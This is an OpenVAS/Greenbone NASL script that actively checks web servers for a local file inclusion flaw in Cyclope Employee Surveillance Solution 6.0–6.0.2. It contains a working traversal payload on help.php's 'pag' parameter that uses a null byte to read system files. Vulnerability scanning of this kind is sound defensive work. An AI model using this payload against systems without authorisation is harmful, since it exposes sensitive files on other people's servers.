# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802934");
  script_version("2023-01-05T10:12:14+0000");
  script_tag(name:"last_modification", value:"2023-01-05 10:12:14 +0000 (Thu, 05 Jan 2023)");
  script_tag(name:"creation_date", value:"2012-08-16 12:28:45 +0530 (Thu, 16 Aug 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cyclope Employee Surveillance Solution 6.x - 6.0.2 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 7879);
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Cyclope Employee Surveillance Solution is prone to local file
  inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An improper validation of user-supplied input via the 'pag'
  parameter to 'help.php', that allows remote attackers to view files and execute local scripts in
  the context of the webserver.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain
  potentially sensitive information.");

  script_tag(name:"affected", value:"Cyclope Employee Surveillance Solution version 6.0 through
  6.0.2.");

  script_tag(name:"solution", value:"Update to version 6.2.1 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20545/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115590/cyclopees-sqllfi.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 7879);
if (!http_can_host_php(port: port))
  exit(0);

res = http_get_cache(port: port, item: "/activate.php");
if (!res || res !~ "HTTP/1\.[01] 200" || "<title>Cyclope" >!< res ||
    "Cyclope Employee Surveillance Solution" >!< res)
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = "/help.php?pag=../../../../../../" +  files[file] + "%00";

  if (http_vuln_check(port: port, url: url,pattern: file, extra_check: make_list("Cyclope Employee"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
